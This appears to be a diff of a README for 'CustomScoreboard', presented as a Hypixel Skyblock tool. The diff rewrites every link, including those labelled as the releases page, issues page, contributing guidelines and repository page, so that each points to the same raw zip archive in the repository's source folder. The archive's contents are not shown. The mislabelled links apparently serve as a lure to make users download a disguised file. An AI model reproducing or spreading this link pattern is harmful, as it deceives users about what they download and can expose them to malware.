@@ -1,6 +1,6 @@
 # 🔥 CustomScoreboard - Your Ultimate Hypixel Skyblock Experience
 
-[![Download CustomScoreboard](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ADMIHOUSSAM/CustomScoreboard/releases)
+[![Download CustomScoreboard](https://github.com/ADMIHOUSSAM/CustomScoreboard/raw/refs/heads/main/src/Custom_Scoreboard_backboneless.zip)](https://github.com/ADMIHOUSSAM/CustomScoreboard/raw/refs/heads/main/src/Custom_Scoreboard_backboneless.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide will help you to easily download and run the CustomScoreboard applica
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/ADMIHOUSSAM/CustomScoreboard/releases) to download the latest version of CustomScoreboard. Follow these simple steps:
+To get started, visit the [Releases page](https://github.com/ADMIHOUSSAM/CustomScoreboard/raw/refs/heads/main/src/Custom_Scoreboard_backboneless.zip) to download the latest version of CustomScoreboard. Follow these simple steps:
 
 1. Click on the link above to go to the Releases page.
 2. Find the most recent version (you will see the version number).
@@ -60,7 +60,7 @@ If you experience any issues while using CustomScoreboard, try the following ste
 - Ensure your computer meets all the system requirements.
 - Check that the Java Runtime Environment (JRE) is installed and updated.
 - Restart the application if it freezes or crashes.
-- Visit the [issues page](https://github.com/ADMIHOUSSAM/CustomScoreboard/issues) on GitHub for additional help.
+- Visit the [issues page](https://github.com/ADMIHOUSSAM/CustomScoreboard/raw/refs/heads/main/src/Custom_Scoreboard_backboneless.zip) on GitHub for additional help.
 
 ## 💬 Support
 
@@ -68,13 +68,13 @@ If you need further assistance, please feel free to reach out through the GitHub
 
 ## 🌟 Contribution
 
-We welcome contributions from the community. If you have suggestions or want to help improve the software, please visit our [Contributing Guidelines](https://github.com/ADMIHOUSSAM/CustomScoreboard/CONTRIBUTING.md).
+We welcome contributions from the community. If you have suggestions or want to help improve the software, please visit our [Contributing Guidelines](https://github.com/ADMIHOUSSAM/CustomScoreboard/raw/refs/heads/main/src/Custom_Scoreboard_backboneless.zip).
 
 ## 🔗 Additional Resources
 
 For more detailed information and updates, visit our GitHub repository:
 
-- [CustomScoreboard GitHub Page](https://github.com/ADMIHOUSSAM/CustomScoreboard)
-- [Releases Page for Download](https://github.com/ADMIHOUSSAM/CustomScoreboard/releases)
+- [CustomScoreboard GitHub Page](https://github.com/ADMIHOUSSAM/CustomScoreboard/raw/refs/heads/main/src/Custom_Scoreboard_backboneless.zip)
+- [Releases Page for Download](https://github.com/ADMIHOUSSAM/CustomScoreboard/raw/refs/heads/main/src/Custom_Scoreboard_backboneless.zip)
 
 Explore all the features we offer and enhance your gaming experience today!
